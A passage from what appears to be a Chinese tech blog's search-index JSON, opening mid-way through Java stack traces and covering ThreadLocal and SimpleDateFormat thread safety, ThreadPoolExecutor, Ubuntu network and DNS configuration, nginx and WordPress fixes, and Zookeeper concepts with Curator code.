sun.misc.FloatingDecimal.parseDouble(FloatingDecimal.java:110) at java.lang.Double.parseDouble(Double.java:538) at java.text.DigitList.getDouble(DigitList.java:169) at java.text.DecimalFormat.parse(DecimalFormat.java:2089) at java.text.SimpleDateFormat.subParse(SimpleDateFormat.java:2162) at java.text.SimpleDateFormat.parse(SimpleDateFormat.java:1514) at java.text.DateFormat.parse(DateFormat.java:364) at Test.parse(Test.java:15) at Test.lambda$main$0(Test.java:27) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at java.lang.Thread.run(Thread.java:748) java.lang.NumberFormatException: multiple points at sun.misc.FloatingDecimal.readJavaFormatString(FloatingDecimal.java:1890) at sun.misc.FloatingDecimal.parseDouble(FloatingDecimal.java:110) at java.lang.Double.parseDouble(Double.java:538) Sat Jun 01 16:34:30 CST 2019 Sat Jun 01 16:34:30 CST 2019 Tue Jun 01 16:34:30 CST 1 Sat Jun 01 16:34:30 CST 2019 Sat Jun 01 16:34:30 CST 2019 Sat Jun 01 16:34:30 CST 2019 Tue Jun 01 16:34:30 CST 1 Sat Jun 01 16:34:30 CST 2019 Sat Jun 01 16:34:30 CST 2019 Sat Jun 01 16:34:30 CST 2019 Sat Jun 01 16:34:30 CST 2019 Sat Jun 01 16:34:30 CST 2019 Sat Jun 01 16:34:30 CST 2019 Sat Jun 01 16:34:30 CST 2019 at java.text.DigitList.getDouble(DigitList.java:169) at java.text.DecimalFormat.parse(DecimalFormat.java:2089) at java.text.SimpleDateFormat.subParse(SimpleDateFormat.java:1869) at java.text.SimpleDateFormat.parse(SimpleDateFormat.java:1514) at java.text.DateFormat.parse(DateFormat.java:364) at Test.parse(Test.java:15) at Test.lambda$main$0(Test.java:27) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at java.lang.Thread.run(Thread.java:748) java.lang.NumberFormatException: multiple points at sun.misc.FloatingDecimal.readJavaFormatString(FloatingDecimal.java:1890) at sun.misc.FloatingDecimal.parseDouble(FloatingDecimal.java:110) at java.lang.Double.parseDouble(Double.java:538) at java.text.DigitList.getDouble(DigitList.java:169) at java.text.DecimalFormat.parse(DecimalFormat.java:2089) at java.text.SimpleDateFormat.subParse(SimpleDateFormat.java:2162) at java.text.SimpleDateFormat.parse(SimpleDateFormat.java:1514) at java.text.DateFormat.parse(DateFormat.java:364) at Test.parse(Test.java:15) at Test.lambda$main$0(Test.java:27) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at java.lang.Thread.run(Thread.java:748) java.lang.NumberFormatException: For input string: \u0026#34;2019.\u0026#34; at java.lang.NumberFormatException.forInputString(NumberFormatException.java:65) at java.lang.Long.parseLong(Long.java:589) at java.lang.Long.parseLong(Long.java:631) at java.text.DigitList.getLong(DigitList.java:195) at java.text.DecimalFormat.parse(DecimalFormat.java:2084) at java.text.SimpleDateFormat.subParse(SimpleDateFormat.java:1869) at java.text.SimpleDateFormat.parse(SimpleDateFormat.java:1514) at java.text.DateFormat.parse(DateFormat.java:364) at Test.parse(Test.java:15) at Test.lambda$main$0(Test.java:27) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at java.lang.Thread.run(Thread.java:748) Process finished with exit code 0 解决方案4：用ThreadLocal，一个线程一个SimpleDateFormat对象\npublic class DateUtil { private static ThreadLocal\u0026lt;DateFormat\u0026gt; threadLocal = ThreadLocal.withInitial( ()-\u0026gt; new SimpleDateFormat(\u0026#34;yyyy-MM-dd HH:mm:ss\u0026#34;)); public static Date parse(String dateStr) { Date date = null; try { date = threadLocal.get().parse(dateStr); } catch (ParseException e) { e.printStackTrace(); } return date; } } 配合线程池使用，既保证了线程安全，又不至于像 解决方案1 创建太多的SimpleDateFormat对象。\n ThreadLocal 保证的是单个线程内部访问的是同一个实例，不同线程访问的不是同一个实例。详见：ThreadLocal线程单例  参考 Java面试必问：ThreadLocal终极篇 淦！ 被大厂面试官连环炮轰炸的ThreadLocal （吃透源码的每一个细节和设计原理） 万字详解ThreadLocal关键字 面试官：ThreadLocal的应用场景和注意事项有哪些？ 面试官：ThreadLocal的应用场景和注意事项有哪些？ ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/java/threadlocal/","series":["Manual"],"tags":["Java"],"title":"ThreadLocal"},{"categories":["编程思想"],"content":"ThreadLocal 保证的是单个线程内部访问的是同一个实例，不同线程访问的不是同一个实例。\npackage test; public class Singleton { private static final ThreadLocal\u0026lt;Singleton\u0026gt; singleton = new ThreadLocal\u0026lt;Singleton\u0026gt;() { @Override protected Singleton initialValue() { return new Singleton(); } }; public static Singleton getInstance() { return singleton.get(); } private Singleton() { } } package test; public class T implements Runnable { @Override public void run() { Singleton instance = Singleton.getInstance(); System.out.println(instance); } } 测试类：\npackage test; public class Test { public static void main(String[] args){ System.out.println(\u0026#34;main thread \u0026#34;+Singleton.getInstance()); System.out.println(\u0026#34;main thread \u0026#34;+Singleton.getInstance()); System.out.println(\u0026#34;main thread \u0026#34;+Singleton.getInstance()); Thread thread0 = new Thread(new T()); Thread thread1 = new Thread(new T()); thread0.start(); thread1.start(); } } 结果：\n两个线程（线程0和线程1）拿到的对象并不是同一个对象，但是同一线程能保证拿到的是同一个对象，即线程单例。 ThreadLocal是基于ThreadLocalMap来实现的，所以我们在调用get方法的时候，默认走的就是这个map，不用指定key，它维持了线程间的隔离。 ThreadLocal隔离了多个线程对数据的访问冲突。对多线程资源共享的问题，假如使用的是同步锁，那么就是以时间换空间的方式；那假如使用ThreadLocal，那就是用空间换时间的方式。\n参考链接： “单例”模式-ThreadLocal线程单例 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/java/threadlocal%E7%BA%BF%E7%A8%8B%E5%8D%95%E4%BE%8B/","series":["Manual"],"tags":["Java"],"title":"ThreadLocal线程单例"},{"categories":["编程思想"],"content":"如果采用有界BlockingQueue，队列满后启用maximumPoolSize，达到maximumPoolSize上限后走RejectedExecutionHandler的逻辑；如果采用无界BlockingQueue，maximumPoolSize设置无效。\n构造方法 public ThreadPoolExecutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue\u0026lt;Runnable\u0026gt; workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler) { if (corePoolSize \u0026lt; 0 || maximumPoolSize \u0026lt;= 0 || maximumPoolSize \u0026lt; corePoolSize || keepAliveTime \u0026lt; 0) throw new IllegalArgumentException(); if (workQueue == null || threadFactory == null || handler == null) throw new NullPointerException(); this.acc = System.getSecurityManager() == null ? null : AccessController.getContext(); this.corePoolSize = corePoolSize; this.maximumPoolSize = maximumPoolSize; this.workQueue = workQueue; this.keepAliveTime = unit.toNanos(keepAliveTime); this.threadFactory = threadFactory; this.handler = handler; } 构造函数的参数含义如下：\ncorePoolSize：指定了线程池中的线程数量，它的数量决定了添加的任务是开辟新的线程去执行，还是放到workQueue任务队列中去；\nmaximumPoolSize：指定了线程池中的最大线程数量，这个参数会根据你使用的workQueue任务队列的类型，决定线程池会开辟的最大线程数量；\nkeepAliveTime：当线程池中空闲线程数量超过corePoolSize时，多余的线程会在多长时间内被销毁；\nunit：keepAliveTime的单位\nworkQueue：任务队列，被添加到线程池中，但尚未被执行的任务；它一般分为直接提交队列、有界任务队列、无界任务队列、优先任务队列几种；\nthreadFactory：线程工厂，用于创建线程，一般用默认即可；\nhandler：拒绝策略；当任务太多来不及处理时，如何拒绝任务；\n阻塞队列 阻塞队列(BlockingQueue)是一个支持两个附加操作的队列。这两个附加的操作是：在队列为空时，获取元素的线程会等待队列变为非空。当队列满时，存储元素的线程会等待队列可用。阻塞队列常用于生产者和消费者的场景，生产者是往队列里添加元素的线程，消费者是从队列里拿元素的线程。阻塞队列就是生产者存放元素的容器，而消费者也只从容器里拿元素。\n下图中展示了线程1往阻塞队列中添加元素，而线程2从阻塞队列中移除元素：\n使用不同的队列可以实现不一样的任务存取策略。在这里，我们可以再介绍下阻塞队列的成员：\n拒绝策略 用户可以通过实现RejectedExecutionHandler 接口去定制拒绝策略，也可以选择JDK提供的四种已有拒绝策略，其特点如下：\n参考链接： Java线程池实现原理及其在美团业务中的实践 java线程池ThreadPoolExecutor类使用详解 Java多线程-线程池ThreadPoolExecutor构造方法和规则 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/java/threadpoolexecutor/","series":["Manual"],"tags":["Java"],"title":"ThreadPoolExecutor"},{"categories":["其他"],"content":"Ubuntu修改ip\n方式一 这种方式可以修改ip地址，不能访问互联网；虚拟机100必须以这种方式配置（101、102、103是复制100而来）\n1、sudo vi /etc/netplan/50-cloud-init.yaml\nnetwork: ethernets: enp0s3: addresses: [10.0.2.15/24] dhcp4: true enp0s8: addresses: [192.168.56.100/24] dhcp4: false version: 2 2、重启虚拟机\n方式二 这种方式可以修改ip地址，能访问互联网；虚拟机101、102、103以这种方式配置\n1、注释50-cloud-init.yaml里面的修改\n2、sudo vim /etc/network/interfaces\n# This file describes the network interfaces available on your system # and how to activate them. For more information, see interfaces(5). source /etc/network/interfaces.d/* # The loopback network interface auto lo iface lo inet loopback # The primary network interface(NAT) auto enp0s3 iface enp0s3 inet dhcp # 增加的Host-only静态IP设置 (enp0s8 是根据拓扑关系映射的网卡名称（旧规则是eth0,eth1）) # 可以通过 ```ls /sys/class/net```查看，是否为enp0s8 auto enp0s8 iface enp0s8 inet static address 192.168.56.101 netmask 255.255.255.0 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/other/ubuntu%E4%BF%AE%E6%94%B9ip/","series":["Manual"],"tags":["Other"],"title":"Ubuntu修改ip"},{"categories":["其他"],"content":"1、vim /etc/resolv.conf\nnameserver 8.8.8.8 nameserver 114.114.114.114 nameserver 1.2.4.8 2、vim /etc/network/interfaces\ndns-nameserver 8.8.8.8 dns-nameserver 114.114.114.114 dns-nameserver 1.2.4.8 3、/etc/init.d/networking restart\n","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/other/ubuntu%E4%BF%AE%E6%94%B9%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/","series":["Manual"],"tags":["Other"],"title":"Ubuntu修改域名解析"},{"categories":["其他"],"content":"woocommerce_rest_authentication_error\nnginx配置错误导致woocommerce REST API不可用\nIt was a bad configuration of try_files in nginx:\nWRONG\ntry_files $uri $uri/ /index.php?q=$uri\u0026amp;$args; CORRECT\ntry_files $uri $uri/ /index.php$is_args$args; After changing that everything works perfectly ^^\n参考： woocommerce_rest_authentication_error on localhost ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/other/wordpress/woocommerce_rest_authentication_error/","series":["Manual"],"tags":["WordPress"],"title":"woocommerce_rest_authentication_error"},{"categories":["其他"],"content":"WordPress 安装插件 cURL error 77解决\n第一步：执行命令\nyum install ca-certificates 第二步：重启php-fpm\n/etc/init.d/php-fpm restart ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/other/wordpress/wordpress-%E5%AE%89%E8%A3%85%E6%8F%92%E4%BB%B6-curl-error-77%E8%A7%A3%E5%86%B3/","series":["Manual"],"tags":["WordPress"],"title":"WordPress 安装插件 cURL error 77解决"},{"categories":["其他"],"content":"WordPress改造成https的注意事项\nWordPress加入ssl后可能出现的网站访问缓慢、样式无法被加载，是由于站点虽然被改造成了https访问，但是 WordPress 代码层面对于一些css、js、图片等静态资源的访问还是http的，所以才会出现这种情况。解决的办法可以改造代码，也可以安装WordPress插件。下面介绍后者的步骤：\n1、申请证书、上传证书到服务器、配置服务器（阿里云有免费的证书，并有详细的操作步骤）\n2、安装 Really Simple SSL插件，它会将http的请求全都转成https（感谢作者吧）\n3、 后台修改wordpress地址和站点地址，如下图所示：\n参考链接：https://www.rogoso.info/wordpress-ssl/\n","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/other/wordpress/wordpress%E6%94%B9%E9%80%A0%E6%88%90https%E7%9A%84%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/","series":["Manual"],"tags":["WordPress"],"title":"WordPress改造成https的注意事项"},{"categories":["其他"],"content":"wordpress文章发布后，nginx报404解决方法\n修改nginx.conf文件，在location /节点下添加如下代码：\nlocation / { try_files $uri $uri/ /index.php?q=$uri\u0026amp;$args; } 然后重启nginx即可解决。\n","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/other/wordpress/wordpress%E6%96%87%E7%AB%A0%E5%8F%91%E5%B8%83%E5%90%8Enginx%E6%8A%A5404%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/","series":["Manual"],"tags":["WordPress"],"title":"wordpress文章发布后，nginx报404解决方法"},{"categories":["其他"],"content":"WordPress更换域名\n在更换的域名过程中遇到很多坑，主要还是我的架构比较特殊的原因，导致跟以往配置不太一样，架构如下：\n 1. 无法通过nginx转发请求到容器端口 原因：nginx配置不正确\n解决：补充缺失的如下配置\nadd_header X-Frame-Options SAMEORIGIN; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; proxy_hide_header X-Frame-Options; 最终类似：\nserver { listen 443 ssl; listen [::]:443 ssl; include snippets/ssl-params.conf; server_name wptest.your-awesome-domain.com; # domain當然要用自己的，subdomain請隨自己喜好 location / { add_header X-Frame-Options SAMEORIGIN; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; proxy_hide_header X-Frame-Options; proxy_pass http://localhost:8000; # 注意這邊跟上面docker-compose設定的port相同 } } 2. 提示“重定向次数过多” 修改wordpress根目录下的wp-config.php：\n$_SERVER[\u0026#39;HTTPS\u0026#39;] = \u0026#39;on\u0026#39;; define(\u0026#39;FORCE_SSL_LOGIN\u0026#39;, true); define(\u0026#39;FORCE_SSL_ADMIN\u0026#39;, true); 参考链接： https://softman.blog/2019/07/26/nginx-reverse-proxy-to-dockerized-wordpress-the-basic/ ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/other/wordpress/wordpress%E6%9B%B4%E6%8D%A2%E5%9F%9F%E5%90%8D/","series":["Manual"],"tags":["WordPress"],"title":"WordPress更换域名"},{"categories":["编程思想"],"content":"大致来说，zookeeper 的使用场景如下，我就举几个简单的，大家能说几个就好了：\n 分布式协调 分布式锁 元数据/配置信息管理 HA 高可用性  分布式协调 这个其实是 zookeeper 很经典的一个用法，简单来说，就好比，你 A 系统发送个请求到 mq，然后 B 系统消息消费之后处理了。那 A 系统如何知道 B 系统的处理结果？用 zookeeper 就可以实现分布式系统之间的协调工作。A 系统发送请求之后可以在 zookeeper 上对某个节点的值注册个监听器，一旦 B 系统处理完了就修改 zookeeper 那个节点的值，A 系统立马就可以收到通知，完美解决。\n分布式锁 举个栗子。对某一个数据连续发出两个修改操作，两台机器同时收到了请求，但是只能一台机器先执行完另外一个机器再执行。那么此时就可以使用 zookeeper 分布式锁，一个机器接收到了请求之后先获取 zookeeper 上的一把分布式锁，就是可以去创建一个 znode，接着执行操作；然后另外一个机器也尝试去创建那个 znode，结果发现自己创建不了，因为被别人创建了，那只能等着，等第一个机器执行完了自己再执行。\n元数据/配置信息管理 zookeeper 可以用作很多系统的配置信息的管理，比如 kafka、storm 等等很多分布式系统都会选用 zookeeper 来做一些元数据、配置信息的管理，包括 dubbo 注册中心不也支持 zookeeper 么？\nHA 高可用性 这个应该是很常见的，比如 hadoop、hdfs、yarn 等很多大数据系统，都选择基于 zookeeper 来开发 HA 高可用机制，就是一个重要进程一般会做主备两个，主进程挂了立马通过 zookeeper 感知到切换到备用进程。\n参考 zookeeper 都有哪些使用场景？ ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/zookeeper/zookeeper%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/","series":["Manual"],"tags":["ZK"],"title":"Zookeeper应用场景"},{"categories":["编程思想"],"content":"RPC框架中有3个重要的角色：\n 注册中心 ：保存所有服务的名字，服务提供者的ip列表，服务消费者的IP列表 服务提供者： 提供跨进程服务 服务消费者： 寻找到指定命名的服务并消费。  Zookeeper用作注册中心 简单来讲，zookeeper可以充当一个服务注册表（Service Registry），让多个服务提供者形成一个集群，让服务消费者通过服务注册表获取具体的服务访问地址（ip+端口）去访问具体的服务提供者。如下图所示：\n具体来说，zookeeper就是个分布式文件系统，每当一个服务提供者部署后都要将自己的服务注册到zookeeper的某一路径上: /{service}/{version}/{ip:port}, 比如我们的HelloWorldService部署到两台机器，那么zookeeper上就会创建两条目录：分别为/HelloWorldService/1.0.0/100.19.20.01:16888 /HelloWorldService/1.0.0/100.19.20.02:16888。\n这么描述有点不好理解，下图更直观，\n在zookeeper中，进行服务注册，实际上就是在zookeeper中创建了一个znode节点，该节点存储了该服务的IP、端口、调用方式(协议、序列化方式)等。该节点承担着最重要的职责，它由服务提供者(发布服务时)创建，以供服务消费者获取节点中的信息，从而定位到服务提供者真正网络拓扑位置以及得知如何调用。RPC服务注册、发现过程简述如下：\n 服务提供者启动时，会将其服务名称，ip地址注册到配置中心。 服务消费者在第一次调用服务时，会通过注册中心找到相应的服务的IP地址列表，并缓存到本地，以供后续使用。当消费者调用服务时，不会再去请求注册中心，而是直接通过负载均衡算法从IP列表中取一个服务提供者的服务器调用服务。 当服务提供者的某台服务器宕机或下线时，相应的ip会从服务提供者IP列表中移除。同时，注册中心会将新的服务IP地址列表发送给服务消费者机器，缓存在消费者本机。 当某个服务的所有服务器都下线了，那么这个服务也就下线了。 同样，当服务提供者的某台服务器上线时，注册中心会将新的服务IP地址列表发送给服务消费者机器，缓存在消费者本机。 服务提供方可以根据服务消费者的数量来作为服务下线的依据。  感知服务的下线\u0026上线 zookeeper提供了“心跳检测”功能，它会定时向各个服务提供者发送一个请求（实际上建立的是一个 socket 长连接），如果长期没有响应，服务中心就认为该服务提供者已经“挂了”，并将其剔除，比如100.19.20.02这台机器如果宕机了，那么zookeeper上的路径就会只剩/HelloWorldService/1.0.0/100.19.20.01:16888。\n服务消费者会去监听相应路径（/HelloWorldService/1.0.0），一旦路径上的数据有任务变化（增加或减少），zookeeper都会通知服务消费方服务提供者地址列表已经发生改变，从而进行更新。\n更为重要的是zookeeper 与生俱来的容错容灾能力（比如leader选举），可以确保服务注册表的高可用性。\n使用 zookeeper 作为注册中心时，客户端订阅服务时会向 zookeeper 注册自身；主要是方便对调用方进行统计、管理。但订阅时是否注册 client 不是必要行为，和不同的注册中心实现有关，例如使用 consul 时便没有注册。\n参考 Zookeeper用作注册中心的原理 8、Zookeeper服务注册与发现原理浅析 微服务中Zookeeper的应用及原理 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/zookeeper/zookeeper%E6%9C%8D%E5%8A%A1%E6%B3%A8%E5%86%8C%E5%8F%91%E7%8E%B0%E5%8E%9F%E7%90%86/","series":["Manual"],"tags":["ZK"],"title":"Zookeeper服务注册发现原理"},{"categories":["编程思想"],"content":"1. Zookeeper 核心架构设计 1.1 Zookeeper 特点 （1）Zookeeper 是一个分布式协调服务，是为了解决多个节点状态不一致的问题，充当中间机构来调停。如果出现了不一致，则把这个不一致的情况写入到 Zookeeper 中，Zookeeper 会返回响应，响应成功，则表示帮你达成了一致。\n比如，A、B、C 节点在集群启动时，需要推举出一个主节点，这个时候，A、B、C 只要同时往 Zookeeper 上注册临时节点，谁先注册成功，谁就是主节点。\n（2）Zookeeper 虽然是一个集群，但是数据并不是分散存储在各个节点上的，而是每个节点都保存了集群所有的数据。\n其中一个节点作为主节点，提供分布式事务的写服务，其他节点和这个节点同步数据，保持和主节点状态一致。\n（3）Zookeeper 所有节点的数据状态通过 Zab 协议保持一致。当集群中没有 Leader 节点时，内部会执行选举，选举结束，Follower 和 Leader 执行状态同步；当有 Leader 节点时，Leader 通过 ZAB 协议主导分布式事务的执行，并且所有的事务都是串行执行的。\n（4）Zookeeper 的节点个数是不能线性扩展的，节点越多，同步数据的压力越大，执行分布式事务性能越差。推荐3、5、7 这样的数目。\n1.1 Zookeeper 角色的理解 Zookeeper 并没有沿用 Master/Slave 概念，而是引入了 Leader，Follower，Observer 三种角色。\n通过 Leader 选举算法来选定一台服务器充当 Leader 节点，Leader 服务器为客户端提供读、写服务。\nFollower 节点可以参加选举，也可以接受客户端的读请求，但是接受到客户端的写请求时，会转发到 Leader 服务器去处理。\nObserver 角色只能提供读服务，不能选举和被选举，所以它存在的意义是在不影响写性能的前提下，提升集群的读性能。\n1.3 Zookeeper 同时满足了 CAP 吗？ 答案是否，CAP 只能同时满足其二。\nZookeeper 是有取舍的，它实现了 A 可用性、P 分区容错性、C 的写入一致性，牺牲的是 C的读一致性。\n也就是说，Zookeeper 并不保证读取的一定是最新的数据。如果一定要最新，需要使用 sync 回调处理。\n⚠️⚠️⚠️\n 大部分文章指出Zookeeper保证的是CP，牺牲掉可用性：\n不能保证每次服务请求的可用性。任何时刻对ZooKeeper的访问请求能得到一致的数据结果，同时系统对网络分割具备容错性；但是它不能保证每次服务请求的可用性（注：也就是在极端环境下，ZooKeeper可能会丢弃一些请求，消费者程序需要重新请求才能获得结果）。所以说，ZooKeeper不能保证服务可用性。\n进行leader选举时集群都是不可用。在使用ZooKeeper获取服务列表时，当master节点因为网络故障与其他节点失去联系时，剩余节点会重新进行leader选举。问题在于，选举leader的时间太长，30 ~ 120s, 且选举期间整个zk集群都是不可用的，这就导致在选举期间注册服务瘫痪，虽然服务能够最终恢复，但是漫长的选举时间导致的注册长期不可用是不能容忍的。所以说，ZooKeeper不能保证服务可用性。\nZooKeeper和CAP理论及一致性原则 服务注册与发现的实现原理、及实现优劣势比较  2. 核心机制一：ZNode 数据模型 Zookeeper 的 ZNode 模型其实可以理解为类文件系统，如下图：\n2.1 ZNode 并不适合存储太大的数据 为什么是类文件系统呢？因为 ZNode 模型没有文件和文件夹的概念，每个节点既可以有子节点，也可以存储数据。\n那么既然每个节点可以存储数据，是不是可以任意存储无限制的数据呢？答案是否定的。在 Zookeeper 中，限制了每个节点只能存储小于 1 M 的数据，实际应用中，最好不要超过 1kb。\n原因有以下四点：\n 同步压力：Zookeeper 的每个节点都存储了 Zookeeper 的所有数据，每个节点的状态都要保持和 Leader 一致，同步过程至少要保证半数以上的节点同步成功，才算最终成功。如果数据越大，则写入的难度也越大。 请求阻塞：Zookeeper 为了保证写入的强一致性，会严格按照写入的顺序串行执行，某个时刻只能执行一个事务。如果上一个事务执行耗时比较长，会阻塞后面的请求； 存储压力：正是因为每个 Zookeeper 的节点都存储了完整的数据，每个 ZNode 存储的数据越大，则消耗的物理内存也越大； 设计初衷：Zookeeper 的设计初衷，不是为了提供大规模的存储服务，而是提供了这样的数据模型解决一些分布式问题。   除非集群是以ZNode为单位进行同步的，否则以上四点不能算作限定ZNode大小的原因\n 2.2 ZNode 的分类 （1）按生命周期分类\n按照声明周期，ZNode 可分为永久节点和临时节点。\n很好理解，永久节点就是要显示的删除，否则会一直存在；临时节点，是和会话绑定的，会话创建的所有节点，会在会话断开连接时，全部被 Zookeeper 系统删除。\n（2）按照是否带序列号分类\n带序列号的话，比如在代码中创建 /a 节点，创建之后其实是 /a000000000000001，再创建的话，就是 /a000000000000002，依次递增\n不带序号，就是创建什么就是什么\n（3）所以，一共有四种 ZNode\n 永久的不带序号的 永久的带序号的 临时的不带序号的 临时的带序号的  （4）注意的点\n临时节点下面不能挂载子节点，只能作为其他节点的叶子节点。\n2.3 代码实战 ZNode 的数据模型其实很简单，只有这么多知识。下面用代码来巩固一下。\n这里我们使用 curator 框架来做 demo。（当然，你可以选择使用 Zookeeper 官方自带的 Api）\n引入 pom 坐标：\n\u0026lt;!-- curator-framework --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.curator\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;curator-framework\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;4.2.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- curator-recipes --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.curator\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;curator-recipes\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;4.2.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 代码：\npublic class ZkTest { // 会话超时  private final int SESSION_TIMEOUT = 30 * 1000; // 连接超时 、 有啥区别  private static final int CONNECTION_TIMEOUT = 3 * 1000; private static final String CONNECT_ADDR = \u0026#34;localhost:2181\u0026#34;; private CuratorFramework client = null; public static void main(String[] args) throws Exception { // 创建客户端  RetryPolicy retryPolicy = new ExponentialBackoffRetry(1000, 10); CuratorFramework client = CuratorFrameworkFactory.builder() .connectString(CONNECT_ADDR) .connectionTimeoutMs(CONNECTION_TIMEOUT) .retryPolicy(retryPolicy) .build(); client.start(); System.out.println(ZooKeeper.States.CONNECTED); System.out.println(client.getState()); // 创建节点 /test1  client.create() .forPath(\u0026#34;/test1\u0026#34;, \u0026#34;curator data\u0026#34;.getBytes(StandardCharsets.UTF_8)); System.out.println(client.getChildren().forPath(\u0026#34;/\u0026#34;)); // 临时节点  client.create().withMode(CreateMode.EPHEMERAL) .forPath(\u0026#34;/secondPath\u0026#34;, \u0026#34;hello world\u0026#34;.getBytes(StandardCharsets.UTF_8)); System.out.println(new String(client.getData().forPath(\u0026#34;/secondPath\u0026#34;))); client.create().withMode(CreateMode.PERSISTENT_SEQUENTIAL) .forPath(\u0026#34;/abc\u0026#34;, \u0026#34;hello\u0026#34;.getBytes(StandardCharsets.UTF_8)); // 递归创建  client.create() .creatingParentContainersIfNeeded() .forPath(\u0026#34;/secondPath1/sencond2/sencond3\u0026#34;); Thread.sleep(10000); } 3. 核心机制二：Watcher 监听机制 Watcher 监听机制是 Zookeeper 解决各种分布式不一致疑难杂症的独家法门，也是学习 Zookeeper 必学的知识点。\n3.1 对于 Watcher 机制的理解 Zookeeper 提供了数据的发布与订阅的功能，多个订阅者可以同时监听某一个对象，当这个对象自身状态发生变化时（例如节点数据或者节点的子节点个数变化），Zookeeper 系统会通知这些订阅者。\n对于发布和订阅这个概念的理解，我们可以用这个场景来理解：\n比如前两天的台风，老板想发一个通知给员工：明天在家办公。\n于是老板会在钉钉群上 Ding 一个消息，员工自己打开钉钉查看。\n在这个场景中，老板是发布者，员工是订阅者，钉钉群就是 Zookeeper 系统。\n老板并不一一给员工发消息，而是把消息发到群里，员工就可以感知到消息的变化。\n   订阅者 员工 客户端1     系统 钉钉群 Zookeeper系统   发布者 老板 客户端2    3.2 Watcher 机制的流程 客户端首先将 Watcher 注册到服务器上，同时将 Watcher 对象保存在客户端的 Watcher 管理器中。当 Zookeeper 服务端监听到数据状态发生变化时，服务端会首先主动通知客户端，接着客户端的 Watcher 管理器会触发相关的 Watcher 来回调响应的逻辑，从而完成整体的发布/订阅流程。\n监听器 Watcher 的定义：\npublic interface Watcher { // WatchedEvent 对象中有下面三个属性，Zookeeper状态，事件类型，路径 // final private KeeperState keeperState; // final private EventType eventType; // private String path;  abstract public void process(WatchedEvent event); } 下面是监听的大致流程图：\n稍稍解释一下：\n1、Client1 和 Client2 都关心 /app2 节点的数据状态变化，于是注册一个对于 /app2 的监听器到 Zookeeper 上； 2、当 Client3 修改 /app2 的值后，Zookeeper 会主动通知 Client1 和 Client2 ，并且回调监听器的方法 当然这里的数据状态变化有下面这些类型：\n 节点被创建； 节点被删除； 节点数据发生改变； 节点的子节点个数发生改变  3.3 通过代码来初步理解 我们还是用 Curator 框架来验证一下这个监听器\n代码很简单，这里我们使用 TreeCache 表示对于 /app2 的监听，并且注册了监听的方法\npublic class CuratorWatcher { public static void main(String[] args) throws Exception { CuratorFramework client = CuratorFrameworkFactory.builder().connectString(\u0026#34;localhost:2181\u0026#34;) .connectionTimeoutMs(10000) .retryPolicy(new ExponentialBackoffRetry(1000, 10)) .build(); client.start(); String path = \u0026#34;/app2\u0026#34;; TreeCache treeCache = new TreeCache(client, path); treeCache.start(); treeCache.getListenable().addListener((client1, event) -\u0026gt; { System.out.println(\u0026#34;event.getData()，\u0026#34; + event.getData()); System.out.println(\u0026#34;event.getType()，\u0026#34; + event.getType()); }); Thread.sleep(Integer.MAX_VALUE); } } 当 /app2 的状态发生变化时，就会调用监听的方法。\nCurator 是对原生的 Zookeeper Api 有封装的，原生的 Zookeeper 提供的 Api ，注册监听后，当数据发生改变时，监听就被服务端删除了，要重复注册监听。\nCurator 则对这个做了相应的封装和改进。\n4. 代码实战：实现主备选举 